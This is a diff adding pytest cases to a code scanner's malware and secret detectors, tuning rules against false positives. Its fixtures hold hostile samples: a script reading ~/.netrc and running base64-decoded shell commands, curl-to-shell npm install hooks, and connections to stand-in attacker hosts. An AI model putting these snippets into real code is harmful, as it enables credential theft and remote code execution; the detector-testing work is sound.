+        ],
+    )
+    def test_the_ordinary_spelling_is_not(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_documentation, is_test_material
+
+        assert not is_test_material(path)
+        assert not is_documentation(path)
+
+
+class TestVendoredCodeIsSomebodyElsesReview:
+    """`jart/cosmopolitan` vendors CPython's standard library at
+    `third_party/python/Lib/`, and five of its blocking findings were the import
+    machinery doing what the import machinery does: `_bootstrap_external.py` decodes a
+    pyc and executes it, `nntplib.py` reads `.netrc`, and
+    `distutils/command/register.py` reads `.pypirc`.
+
+    The secrets detector has ceilinged on vendored paths since it measured them. The
+    capability detector compared every other kind of path and not that one.
+    """
+
+    SOURCE: ClassVar[str] = (
+        "import base64, os, subprocess\n\n"
+        "def run(blob):\n"
+        "    key = open(os.path.expanduser('~/.netrc')).read()\n"
+        "    cmd = base64.b64decode(blob)\n"
+        "    subprocess.run(cmd, shell=True)\n"
+        "    return key\n"
+    )
+
+    @staticmethod
+    def _severities(tmp_path, relative: str, source: str) -> list:
+        target = tmp_path / relative
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(source)
+        return [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
+        ]
+
+    def test_a_capability_in_vendored_code_is_graded(self, tmp_path) -> None:
+        found = self._severities(tmp_path, "third_party/python/Lib/nntplib.py", self.SOURCE)
+        assert found
+        assert all(f.severity <= Severity.MEDIUM for f in found)
+
+    def test_the_same_file_in_the_projects_own_source_is_not(self, tmp_path) -> None:
+        """The control. Nothing changed but the directory it sits in."""
+        found = self._severities(tmp_path, "app/loader.py", self.SOURCE)
+        assert any(f.severity >= Severity.HIGH for f in found)
+
+
+class TestAKeyInAnAndroidManifestShipsInTheApk:
+    """A Maps key goes in `AndroidManifest.xml` as `com.google.android.geo.API_KEY`
+    because that is where the Maps SDK reads it, and Google restricts it to the app's
+    signing certificate rather than keeping it secret. `DrKLO/Telegram` keeps six across
+    its debug, release and standalone manifests.
+
+    Scoped to `SECRET.GOOGLE.API_KEY.001`, as `google-services.json` already was.
+    Nothing else in a manifest is excused by this.
+    """
+
+    KEY: ClassVar[str] = assemble("AIzaSy", "Ad15pYlMci_xIp9ko6wkEsDzAAA0Dn0RU")
+
+    @staticmethod
+    def _rules(tmp_path, name: str, body: str) -> set[str]:
+        (tmp_path / name).write_text(body)
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    def test_a_manifest_key_is_client_configuration(self, tmp_path) -> None:
+        body = (
+            "<manifest>\n  <application>\n"
+            f'    <meta-data android:name="com.google.android.geo.API_KEY" '
+            f'android:value="{self.KEY}" />\n'
+            "  </application>\n</manifest>\n"
+        )
+        assert "SECRET.GOOGLE.API_KEY.001" not in self._rules(tmp_path, "AndroidManifest.xml", body)
+
+    def test_the_same_key_in_a_server_config_is_reported(self, tmp_path) -> None:
+        """The control."""
+        assert "SECRET.GOOGLE.API_KEY.001" in self._rules(
+            tmp_path, "settings.yml", f"maps_key: {self.KEY}\n"
+        )
+
+
+class TestFirebasesWebConfigSaysItIsPublic:
+    """`excalidraw` commits one in `.env.development` and `.env.production` as
+    `VITE_APP_FIREBASE_CONFIG='{"apiKey":"...","authDomain":"x.firebaseapp.com",...}'`.
+    Firebase documents this object as not secret: the browser needs every field to reach
+    the project, so it ships in the bundle by construction, and the security rules are
+    what protect the data.
+
+    The name cannot answer this. `VITE_APP_FIREBASE_CONFIG` is public by contract and
+    `names_public_by_contract` would have said so -- but the key is inside a JSON blob,
+    and the name the rule sees is `apiKey`.
+    """
+
+    KEY: ClassVar[str] = assemble("AIzaSy", "Ad15pYlMci_xIp9ko6wkEsDzAAA0Dn0RU")
+
+    @staticmethod
+    def _rules(tmp_path, body: str) -> set[str]:
+        (tmp_path / ".env.production").write_text(body)
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    def test_the_config_object_is_not_a_leak(self, tmp_path) -> None:
+        body = (
+            "VITE_APP_FIREBASE_CONFIG='{"
+            f'"apiKey":"{self.KEY}",'
+            '"authDomain":"excalidraw-room.firebaseapp.com",'
+            '"projectId":"excalidraw-room","appId":"1:654800341332:web:4a692de"}\'\n'
+        )
+        assert "SECRET.GOOGLE.API_KEY.001" not in self._rules(tmp_path, body)
+
+    def test_a_bare_key_in_the_same_file_still_is(self, tmp_path) -> None:
+        """The control. `authDomain` pointing at `firebaseapp.com` is the whole claim --
+        it is the server half of the handshake and appears in nothing else."""
+        assert "SECRET.GOOGLE.API_KEY.001" in self._rules(tmp_path, f"GOOGLE_MAPS_KEY={self.KEY}\n")
+
+
+class TestInstallingSoftwareIsWhatAnInstallerDoes:
+    """A quarter of the persistence findings in the corpus are on scripts whose job is to
+    install something, and `MACHINE_PROVISIONING` was written to ceiling exactly those --
+    but it required the package manager to be the first thing on the line, and almost no
+    real installer writes it that way.
+
+    `angristan/openvpn-install` writes `run_cmd_fatal "Installing prerequisites" apt-get
+    install -y ...`. `snipe-it` writes `DEBIAN_FRONTEND=noninteractive apt-get install`.
+    `hashcat` writes `if ${sudo_cmd} apt-get install`. `AutoGPT`'s installer provisions a
+    Mac with `brew install`, which was not in the list at all.
+    """
+
+    @staticmethod
+    def _provisioning(text: str, path: str = "x.sh") -> bool:
+        from cordon_scanner.core.samples import is_machine_provisioning
+
+        return is_machine_provisioning(text.encode(), path)
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            '    run_cmd_fatal "Installing prerequisites" apt-get install -y curl',
+            "  DEBIAN_FRONTEND=noninteractive apt-get install -y nginx",
+            "  if ${sudo_cmd} apt-get install -y libfoo; then",
+            "        brew install ollama",
+            "  sudo port install openssl",
+            "  choco install git",
+        ],
+    )
+    def test_every_wrapper_the_corpus_writes(self, line: str) -> None:
+        assert self._provisioning(line + "\n")
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            # Help text naming the command a user should run. `hashcat` prints this three
+            # lines above actually running it, and the quoted message has to close before
+            # the package manager for exactly this reason.
+            'echo "    apt-get install libfoo"',
+            "# apt-get install is how you would do this by hand",
+        ],
+    )
+    def test_talking_about_the_command_is_not_running_it(self, line: str) -> None:
+        assert not self._provisioning(line + "\n")
+
+    @pytest.mark.parametrize(
+        "path", ["bin/omarchy-install-dev-env", "tools/install_dependencies.sh", "setup-app.sh"]
+    )
+    def test_a_filename_that_says_installer(self, path: str) -> None:
+        """`omarchy` installs through its own `omarchy-pkg-add` wrapper and names no
+        package manager at all. The filename is the statement that is left."""
+        assert self._provisioning("omarchy-pkg-add php composer\n", path)
+
+    def test_an_ordinary_script_is_not_an_installer(self, path: str = "bin/serve.sh") -> None:
+        """The control, and the reason this ceilings persistence and nothing else."""
+        assert not self._provisioning("exec ./server --port 8080\n", path)
+
+
+class TestTheNamesADirectoryGivesItsDemoKeys:
+    """Four compound directory names holding key material. `mbedtls` keeps two RSA keys in
+    `yotta/data/example-benchmark/main.cpp`, `docker-mailserver` a TLS key under
+    `demo-setups/`, `coolify` four in `database/seeders/`, and `postal` a signing key in
+    `docker/ci-config/`.
+
+    Compounds only. A directory called `examples/` or `demo/` outright is already a glob
+    in `TEST_MATERIAL_PATHS`; what a glob cannot see is the word inside a longer name.
+    """
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "yotta/data/example-benchmark/main.cpp",
+            "demo-setups/relay-compose.yaml",
+            "database/seeders/PrivateKeySeeder.php",
+            "app/sample-data/keys.json",
+            "test-fixtures/server.key",
+        ],
+    )
+    def test_the_compound_name_is_read(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert is_test_material(path)
+
+    @pytest.mark.parametrize(
+        "path", ["conf/server.key", "components/ota/script/private_key.pem", "Build/sideload.key"]
+    )
+    def test_a_key_in_an_ordinary_place_still_reports(self, path: str) -> None:
+        """The control: three real committed keys from the same corpus sample."""
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert not is_test_material(path)
+
+
+class TestVagrantsOtherInsecureKey:
+    """The RSA insecure key has been in `PUBLISHED_PRIVATE_KEY_BODIES` since the corpus
+    first measured it. Vagrant ships an ed25519 one beside it at
+    `keys/vagrant.key.ed25519`, for the same reason and with the same guarantee: Vagrant
+    replaces it on first `vagrant up`, and its whole purpose is to be known.
+
+    The slice starts at the public point and not at the armour. An unencrypted
+    OpenSSH-format ed25519 key opens with seventy fixed characters -- the format name,
+    `none` twice for the cipher and the kdf, and the key count -- and the first draft of
+    the entry was exactly those, which would have dismissed every ed25519 private key in
+    existence.
+    """
+
+    PUBLIC_POINT: ClassVar[str] = "QyNTUxOQAAACDdWHcQaTZc8Q6nycsP0CqMNRfsLxvYVxqKosrHyTp+WA"
+    GENERIC_HEAD: ClassVar[str] = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMw"
+
+    def _key(self, body: str) -> bytes:
+        return (
+            b"-----BEGIN OPENSSH PRIVATE KEY-----\n"
+            + "\n".join([body + "AAAAJj2TBMT9kwTEwAAAAtzc2gtZWQyNTUxOQAAACDd"] * 6).encode()
+            + b"\n-----END OPENSSH PRIVATE KEY-----\n"
+        )
+
+    def test_vagrants_key_is_recognised(self) -> None:
+        from cordon_scanner.detect.secrets import holds_published_key
+
+        assert holds_published_key(self._key(self.GENERIC_HEAD + self.PUBLIC_POINT), 40)
+
+    def test_any_other_ed25519_key_is_not(self) -> None:
+        """The control the first draft of this entry failed. Every unencrypted ed25519
+        key shares the head; only Vagrant's shares the point."""
+        from cordon_scanner.detect.secrets import holds_published_key
+
+        other = self.GENERIC_HEAD + "QyNTUxOQAAACD9QzQ2LmNb4Rv1Ksd3TfAq2EgHj0Cg5AqB7xQ2mVt9Q"
+        assert not holds_published_key(self._key(other), 40)
+
+
+class TestAnImportBringsANameIntoScope:
+    """`zeroclaw` writes `use reqwest::Client;` and `pnpm` writes `use reqwest::Url;`,
+    and both were reported as opening an outbound connection. `DECLARATION` already held
+    the keywords that make what follows a definition -- `function`, `def`, `fn`, `class`
+    -- and not the one Rust uses to name something it did not define.
+    """
+
+    @staticmethod
+    def _is_declaration(line: str, needle: str) -> bool:
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        content = FileContent.from_bytes("x.rs", line.encode())
+        offset = line.index(needle)
+        return CapabilityDetector._is_declaration(content, offset, offset + len(needle))
+
+    @pytest.mark.parametrize(
+        ("line", "needle"),
+        [
+            ("use reqwest::Client;\n", "reqwest"),
+            ("use std::process::Command;\n", "Command"),
+            ("    use reqwest::Url;\n", "reqwest"),
+        ],
+    )
+    def test_a_use_declaration_calls_nothing(self, line: str, needle: str) -> None:
+        assert self._is_declaration(line, needle)
+
+    def test_the_call_is_still_a_call(self) -> None:
+        """The control. Naming the type is not constructing it."""
+        assert not self._is_declaration("    let c = reqwest::Client::new();\n", "reqwest")
+
+
+class TestAHostWrittenAsAQuotedString:
+    """`_is_local_target` read a `curl` or `wget` line and a written-out URL, and nothing
+    else. Every language that opens a socket directly writes the host on its own:
+    `pnpm`'s benchmark harness has `TcpStream::connect(("127.0.0.1", port))`, and Go,
+    Python and Rust all spell it that way.
+
+    Adding a source of hosts can only make suppression harder, never easier: the test
+    requires EVERY host on the line to be local.
+    """
+
+    @staticmethod
+    def _local(line: str) -> bool:
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        content = FileContent.from_bytes("x.rs", line.encode())
+        return CapabilityDetector._is_local_target(content, 4)
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            '    if TcpStream::connect(("127.0.0.1", port)).is_ok() {\n',
+            '    conn, err := net.Dial("tcp", "localhost:8080")\n',
+            '    sock.connect(("::1", 9000))\n',
+        ],
+    )
+    def test_a_quoted_loopback_is_local(self, line: str) -> None:
+        assert self._local(line)
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            '    sock.connect(("evil.example.com", 443))\n',
+            # The mixed case, which is the reason the quantifier is "every".
+            '    relay("127.0.0.1", "collect.example.net")\n',
+        ],
+    )
+    def test_a_real_destination_is_not(self, line: str) -> None:
+        assert not self._local(line)
+
+
+class TestADocstringIsProseInAString:
+    """`NousResearch/hermes-agent` opens `gateway/shutdown_forensics.py` with a summary of
+    what it collects: "/proc summaries, systemd parentage, takeover markers, TracerPid,
+    1-min load". `TracerPid` in that sentence was reported as code checking whether it is
+    being traced. The file is named for reading those things, and the docstring says so.
+
+    No comment test can see this -- a docstring is a string, not a comment. The secrets
+    detector has parsed these since it measured them; the capability detector had not.
+    """
+
+    @staticmethod
+    def _rules(tmp_path, source: str) -> set[str]:
+        (tmp_path / "forensics.py").write_text(source)
+        return flagged(tmp_path)
+
+    def test_a_word_in_a_docstring_is_not_a_check(self, tmp_path) -> None:
+        source = (
+            '"""Collects /proc summaries, systemd parentage, TracerPid and load.\n\n'
+            'Written for post-mortem review of a shutdown."""\n\n'
+            "def collect():\n    return {}\n"
+        )
+        assert "SUSPECT.ANTI_ANALYSIS.001" not in self._rules(tmp_path, source)
+
+    def test_the_same_word_in_code_still_is(self, tmp_path) -> None:
+        """The control."""
+        source = (
+            '"""Collects runtime state."""\n\n'
+            "import subprocess, base64\n\n"
+            "def collect(blob):\n"
+            "    traced = open('/proc/self/status').read()\n"
+            "    if 'TracerPid:\\t0' not in traced:\n"
+            "        return None\n"
+            "    subprocess.run(base64.b64decode(blob), shell=True)\n"
+        )
+        assert "SUSPECT.ANTI_ANALYSIS.001" in self._rules(tmp_path, source)
+
+
+class TestAStopwatchHasTwoReadings:
+    """`CAP.ANTI.DEBUGGER.001` carried two one-sided patterns: a clock read before a
+    `debugger;`, or one after it. `dotnet/runtime` showed that is not enough --
+    `src/mono/browser/runtime/debug.ts` has a `debugger;` behind a `dotnetDebugger` flag
+    and, two hundred characters later past a function boundary, a
+    `console.assert(!!Date.now(), ...)` with a comment explaining it is a Terser
+    workaround.
+
+    The trick is a difference: read the clock, enter the debugger, read it again, and see
+    whether somebody was stepping. Both readings, or it is not a stopwatch. A debugger
+    implementation entering the debugger is the clearest case of helping analysis.
+    """
+
+    @staticmethod
+    def _matches(raw: bytes) -> bool:
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        rule = next(
+            r for r in RuleSet(RuleLoader.load_builtin()) if r.id == "CAP.ANTI.DEBUGGER.001"
+        )
+        return bool(rule.match.regex.search(raw))
+
+    def test_the_stopwatch_is_still_caught(self) -> None:
+        assert self._matches(
+            b"const t = Date.now();\ndebugger;\nif (Date.now() - t > 100) return;\n"
+        )
+
+    def test_a_loop_around_it_is_too(self) -> None:
+        """The other real trick, which this did not touch."""
+        assert self._matches(b"while (true) {\n    debugger;\n}\n")
+
+    def test_a_breakpoint_and_an_unrelated_clock_read_is_not(self) -> None:
+        assert not self._matches(
+            b"    if ((<any>globalThis).dotnetDebugger)\n"
+            b"        debugger;\n}\n\n"
+            b"export function f(s) {\n"
+            b"    console.assert(!!Date.now(), `x ${s}`);\n"
+        )
+
+
+class TestAFileNamedForAuthenticationOwnsWhatItReads:
+    """`SUSPECT.EXFIL.CREDENTIAL_STORE.001` rests on a credential store "this component
+    does not own". An application that talks to AWS Bedrock has to read the AWS
+    credential chain, and the file that does it is called `gcpauth.rs` or
+    `anthropic_credentials.py`. `pnpm` revokes a token in `logout.rs` -- releasing a
+    credential, which is the opposite of the act the rule is about.
+
+    A ceiling and not a dismissal, deliberately: a filename is a claim, not a proof. What
+    it buys is that `auth.py` reading `~/.aws/credentials` stops outranking the same read
+    in a file with no business doing it.
+    """
+
+    @staticmethod
+    def _names(path: str) -> bool:
+        from cordon_scanner.core.samples import names_authentication
+
+        return names_authentication(path)
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "crates/goose/src/providers/gcpauth.rs",
+            "agent/anthropic_credentials.py",
+            "crates/auth-commands/src/logout.rs",
+            "auth/commands/src/logout.ts",
+            "internal/session_store.go",
+            "lib/oauth2_client.rb",
+            # The suffix form, which is how most projects spell it.
+            "auth/jwtauth.go",
+        ],
+    )
+    def test_the_filename_is_the_claim(self, path: str) -> None:
+        assert self._names(path)
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "src/providers/bedrock.rs",
+            "modules/browser/importChromeLoginData.ts",
+            "g4f/cli/client.py",
+        ],
+    )
+    def test_every_other_name_still_reports_in_full(self, path: str) -> None:
+        """The control, and three files from the corpus that keep their severity: reading
+        somebody's browser login database is not authentication however useful it is."""
+        assert not self._names(path)
+
+
+class TestABacktickInProseIsNotACommand:
+    """The broadest single defect this pass found. Three shell-family spawn rules carried
+    `` `[^`]{2,}` `` -- any two characters between backticks -- which is also the markdown
+    convention for inline code, and every language's doc comments use it.
+
+    `netdata` writes `` `JournalFile` `` in a Rust doc comment. `dotfiles` writes
+    `` `zopfli` ``. vLLM writes `` `setdefault` `` in a docstring. `getgrav/grav` builds a
+    regex as ``'`' . $token[0] . '([A-Za-z0-9+/]+={0,2})' . $token[1] . '`mu'`` and was
+    reported as spawning a process. The spawn half of every composite was free in any file
+    that documented itself.
+
+    A command substitution runs a program, so the content has to contain something only a
+    command line has: a space before an argument, a path separator, a variable, or a
+    pipeline or redirect. Plus the handful of commands a script really does substitute
+    bare.
+    """
+
+    RULES: ClassVar[tuple[str, ...]] = (
+        "CAP.SH.SPAWN.001",
+        "CAP.PHP.SPAWN.001",
+        "CAP.MK.SPAWN.001",
+    )
+
+    @staticmethod
+    def _matches(rule_id: str, raw: bytes) -> bool:
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        rule = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == rule_id)
+        return bool(rule.match.regex.search(raw))
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"/// Reads a `JournalFile` from disk.",
+            b"# Wraps `zopfli` when it is installed.",
+            b"    *driver_env_vars* are applied with `setdefault`.",
+            b"// See `std::process::Command` for the real thing.",
+        ],
+    )
+    @pytest.mark.parametrize("rule_id", RULES)
+    def test_inline_code_in_prose_spawns_nothing(self, rule_id: str, raw: bytes) -> None:
+        assert not self._matches(rule_id, raw)
+
+    def test_a_backtick_inside_single_quotes_is_a_character(self, tmp_path) -> None:
+        """The case the pattern alone could not answer. `getgrav/grav` uses the backtick
+        as its `preg` delimiter and builds the pattern by concatenation, so the content
+        between the two backticks genuinely contains spaces, a `$` and a `/` -- it looks
+        exactly like a command line, because it is a regular expression.
+
+        What settles it is the quote state: every backtick in it is a character in a
+        single-quoted string. Single quotes only -- in shell, `x="`ls`"` IS a
+        substitution, because double quotes interpolate and backticks inside them run."""
+        (tmp_path / "Page.php").write_text(
+            "<?php\n"
+            "$patterns = ['`' . $token[0] . '([A-Za-z0-9+/]+={0,2})' . $token[1] . '`mu'];\n"
+            "$raw = base64_decode($match[1]);\n"
+        )
+        assert "SUSPECT.DECODE_EXEC.001" not in flagged(tmp_path)
+
+    def test_a_substitution_in_double_quotes_still_runs(self, tmp_path) -> None:
+        """The control, and the reason the test asks WHICH quote."""
+        (tmp_path / "run.sh").write_text(
+            '#!/bin/sh\nblob=$(cat payload.b64)\nout="`echo $blob | base64 -d`"\neval "$out"\n'
+        )
+        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"out=`ls -la /tmp`",
+            b"v=`cat /etc/passwd`",
+            b"y=`curl -s http://x/p | sh`",
+            b"z=`$HOME/bin/tool`",
+            # The bare forms worth keeping, which is why there is a second alternative.
+            b"u=`whoami`",
+            b"h=`hostname`",
+        ],
+    )
+    @pytest.mark.parametrize("rule_id", RULES)
+    def test_a_real_substitution_still_does(self, rule_id: str, raw: bytes) -> None:
+        assert self._matches(rule_id, raw)
+
+    def test_the_declared_baselines_moved_with_it(self) -> None:
+        """Three `baseline_hits` declarations had to come down by one, which is the
+        mechanism working: the benign corpus had files whose only spawn hit was a
+        backtick-quoted word in a comment, and a narrowing that did not change a
+        declaration would have been a narrowing nobody measured."""
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        declared = {
+            r.id: r.rule.baseline_hits
+            for r in RuleSet(RuleLoader.load_builtin())
+            if r.id in self.RULES
+        }
+        assert declared == {
+            "CAP.SH.SPAWN.001": 2,
+            "CAP.PHP.SPAWN.001": 1,
+            "CAP.MK.SPAWN.001": 1,
+        }
+
+
+class TestAFlagBelongsToItsOwnCommand:
+    """`mathiasbynens/dotfiles` has a `dataurl` helper that runs
+    `openssl base64 -in "$1" | tr -d '\\n'`. The decode pattern was
+    `openssl\\s+(?:enc|base64)\\b[^\\n]*-d\\b`, and `[^\\n]*` reached across the pipe into
+    `tr`'s `-d` -- so encoding a file as a data URL was read as decoding a payload.
+    """
+
+    @staticmethod
+    def _matches(raw: bytes) -> bool:
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        rule = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == "CAP.SH.DECODE.001")
+        return bool(rule.match.regex.search(raw))
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"""openssl base64 -in "$1" | tr -d '\\n'""",
+            b"openssl base64 -in cert.pem; tr -d x",
+        ],
+    )
+    def test_a_flag_after_a_separator_is_another_commands(self, raw: bytes) -> None:
+        assert not self._matches(raw)
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b'echo "$B" | openssl base64 -d > /tmp/x',
+            b"openssl enc -aes-256-cbc -d -in x.enc -out x",
+            b"openssl base64 -decode -in x.b64",
+        ],
+    )
+    def test_decoding_still_matches(self, raw: bytes) -> None:
+        assert self._matches(raw)
+
+
+class TestHexIsHowAChecksumIsWrittenDown:
+    """`Wei-Shaw/sub2api` writes `hex.DecodeString(installation.BinarySHA256)` and then
+    runs the binary -- which is VERIFYING it, and came out as decode-then-execute, the
+    opposite of what it does. `netdata` writes `hex::decode(content.trim())` to read a
+    journal UUID.
+
+    Decoding a checksum, a digest or a UUID is parsing an identifier rather than
+    unpacking a payload.
+    """
+
+    @staticmethod
+    def _matches(rule_id: str, raw: bytes) -> bool:
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        rule = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == rule_id)
+        return bool(rule.match.regex.search(raw))
+
+    @pytest.mark.parametrize(
+        ("rule_id", "raw"),
+        [
+            ("CAP.GO.DECODE.001", b"b, _ := hex.DecodeString(installation.BinarySHA256)"),
+            ("CAP.GO.DECODE.001", b"b, _ := hex.DecodeString(hashValue)"),
+            ("CAP.BUILD.DECODE.001", b"let u = hex::decode(uuid_text)?;"),
+            ("CAP.BUILD.DECODE.001", b"let c = hex::decode(expected_sha256)?;"),
+            ("CAP.BUILD.DECODE.001", b"let d = hex::decode(file_digest)?;"),
+        ],
+    )
+    def test_an_identifier_is_not_a_payload(self, rule_id: str, raw: bytes) -> None:
+        assert not self._matches(rule_id, raw)
+
+    @pytest.mark.parametrize(
+        ("rule_id", "raw"),
+        [
+            ("CAP.GO.DECODE.001", b"b, _ := hex.DecodeString(blob)"),
+            ("CAP.BUILD.DECODE.001", b"let p = hex::decode(payload)?;"),
+            ("CAP.BUILD.DECODE.001", b"let d = hex::decode(shellcode)?;"),
+        ],
+    )
+    def test_anything_else_is_still_a_decode(self, rule_id: str, raw: bytes) -> None:
+        """The control, and the reason the list is checksum words and not a guess about
+        what a payload is called."""
+        assert self._matches(rule_id, raw)
+
+
+class TestAPrepareScriptCannotReachAConsumer:
+    """`INSTALL_TIME_HOOKS` lumped `prepare`, `prepublish` and `prepack` with
+    `preinstall`, `install` and `postinstall`, and its docstring said they all "run on
+    every machine that ever installs the package, transitively". That is true of the first
+    three and false of the last three.
+
+    npm has documented the difference since version 7: `prepare` runs on a local
+    `npm install` in the package's own directory and before `npm pack`; `prepack`,
+    `prepublish` and `prepublishOnly` run only while publishing. None of them fires for a
+    package installed from a registry tarball, which is how every transitive dependency
+    arrives.
+
+    They still report -- `prepare` DOES fire for a dependency installed from a git URL --
+    below the severity that blocks a build. Six of twelve findings in a 183-file sample
+    were these: `svelte-kit sync`, `git config blame.ignoreRevsFile`, and
+    `svelte-package && publint`.
+    """
+
+    @staticmethod
+    def _findings(tmp_path, scripts: str) -> list:
+        (tmp_path / "package.json").write_text(
+            '{\n  "name": "x",\n  "version": "1.0.0",\n  "scripts": {\n' + scripts + "\n  }\n}\n"
+        )
+        return [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SUSPECT.INSTALL.SCRIPT.001"
+        ]
+
+    @pytest.mark.parametrize(
+        "script",
+        [
+            '    "prepare": "svelte-kit sync"',
+            '    "prepack": "svelte-kit sync && svelte-package && publint"',
+            '    "prepare": "git config blame.ignoreRevsFile .git-blame-ignore-revs"',
+            '    "prepublishOnly": "npm run build && node ./scripts/check.mjs"',
+        ],
+    )
+    def test_an_author_time_hook_is_graded(self, tmp_path, script: str) -> None:
+        found = self._findings(tmp_path, script)
+        assert found
+        assert all(f.severity <= Severity.MEDIUM for f in found)
+
+    def test_a_consumer_time_hook_is_not(self, tmp_path) -> None:
+        """The control, and the whole point of the distinction: `postinstall` is the npm
+        attack shape because it runs on every machine that installs the package."""
+        found = self._findings(tmp_path, '    "postinstall": "node ./scripts/setup.js"')
+        assert found
+        assert any(f.severity >= Severity.HIGH for f in found)
+
+    def test_a_pipe_to_a_shell_is_a_different_rule_entirely(self, tmp_path) -> None:
+        """And the grade reaches none of it. A `preinstall` that pipes a fetch into a
+        shell is `MALWARE.INSTALL.FETCH_EXEC.001` at critical, which no ceiling in this
+        file touches -- so the author-time grading cannot be used to smuggle one in."""
+        self._findings(tmp_path, '    "preinstall": "curl -fsSL https://example.test/i.sh | sh"')
+        assert "MALWARE.INSTALL.FETCH_EXEC.001" in flagged(tmp_path)
+
+    def test_nor_can_an_author_time_hook_smuggle_one(self, tmp_path) -> None:
+        """The same line under `prepack`. The grading applies to the two
+        `SUSPECT.INSTALL.SCRIPT.001` branches and to nothing above them."""
+        self._findings(tmp_path, '    "prepack": "curl -fsSL https://example.test/i.sh | sh"')
+        assert "MALWARE.INSTALL.FETCH_EXEC.001" in flagged(tmp_path)
+
+    def test_the_message_says_which_kind_it_is(self, tmp_path) -> None:
+        """A reader who is told a script "runs automatically during install" and finds it
+        is a publish step has been misled, and the grade alone does not tell them."""
+        found = self._findings(tmp_path, '    "prepack": "svelte-kit sync && svelte-package"')
+        assert any("author's machine" in f.message for f in found)
+
+
+class TestTiktokenIsALibraryNotAToken:
+    """`langgenius/dify` sets `ENV TIKTOKEN_CACHE_DIR=/app/api/.tiktoken_cache` and
+    `open-webui` sets `ARG USE_TIKTOKEN_ENCODING_NAME="cl100k_base"`. Both names carry
+    `TOKEN` because `tiktoken` is a tokeniser, and both values are a directory and an
+    encoding name.
+
+    The suffix list is the one `names_configuration` has refused since the secrets
+    detector's second release. The Docker rule was the one place it had not been applied.
+
+    And `lobehub` writes `ENV KEY_VAULTS_SECRET="" \\` as the first of eight variables in
+    one `ENV`: an empty value the operator supplies at run time, which the existing
+    empty-value test could not see past the line continuation.
+    """
+
+    @staticmethod
+    def _matches(line: bytes) -> bool:
+        from cordon_scanner.detect.config_files import RULES
+
+        rule = next(r for r in RULES if r.rule_id == "SUSPECT.CONTAINER.BUILD_SECRET.001")
+        return bool(rule.pattern.search(line))
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            b"ENV TIKTOKEN_CACHE_DIR=/app/api/.tiktoken_cache\n",
+            b'ARG USE_TIKTOKEN_ENCODING_NAME="cl100k_base"\n',
+            b'ENV KEY_VAULTS_SECRET="" \\\n',
+            b"ENV SSL_KEY_FILE=/etc/ssl/private/server.key\n",
+            b"ARG TOKEN_ENDPOINT_URL=https://auth.example.test/token\n",
+        ],
+    )
+    def test_configuration_is_not_a_secret(self, line: bytes) -> None:
+        assert not self._matches(line)
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            b"ENV PASSWORD=alpine\n",
+            b"ARG NPM_TOKEN=npm_aB3kQ9mZ2xT7vF8cH1jL5nP0rS4wY6\n",
+            b"ENV DB_PASSWORD=hunter2longenough\n",
+        ],
+    )
+    def test_a_baked_in_credential_still_is(self, line: bytes) -> None:
+        """The control. `alpine` is Docker-OSX's documented default, and it is still a
+        password shipped in a layer."""
+        assert self._matches(line)
+
+
+class TestAskingWhetherAnAttributeExists:
+    """Two reflective shapes that reach a VALUE rather than a function.
+
+    `unslothai/unsloth` detects its runtime with
+    `if getattr(sys, f"__{name}__", None) is None:`. The third argument is the caller
+    saying it is prepared for the attribute not to be there, which is a probe.
+
+    `NousResearch/hermes-agent` caches a rendered banner as
+    `cached = globals()[cache_name]`. This rule is about reaching a FUNCTION by a computed
+    name, and that reaches a string.
+
+    Both need the invocation test as well, and that map had to grow a case: it covered
+    `getattr(...)()` and not `globals()[...]()`, because the outer call's callee is a
+    subscript rather than a call.
+    """
+
+    @staticmethod
+    def _dispatch(source: str) -> list[str]:
+        from cordon_scanner.core.models import Capability
+        from cordon_scanner.detect.pyast import PythonAnalyzer
+
+        return [
+            h.detail
+            for h in PythonAnalyzer.analyse(source)
+            if h.capability is Capability.DYNAMIC_DISPATCH
+        ]
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            'import sys\nif getattr(sys, f"__{n}__", None) is None:\n    pass\n',
+            "cached = globals()[cache_name]\n",
+            "value = vars()[computed]\n",
+        ],
+    )
+    def test_a_probe_and_a_lookup_dispatch_nothing(self, source: str) -> None:
+        assert self._dispatch(source) == []
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            # A default AND a call is still dispatch, which is what the invocation test
+            # is for.
+            "import os\ngetattr(os, decode(blob), None)()\n",
+            "globals()[name]()\n",
+            # Two arguments: no default, so the caller expects the attribute to be there.
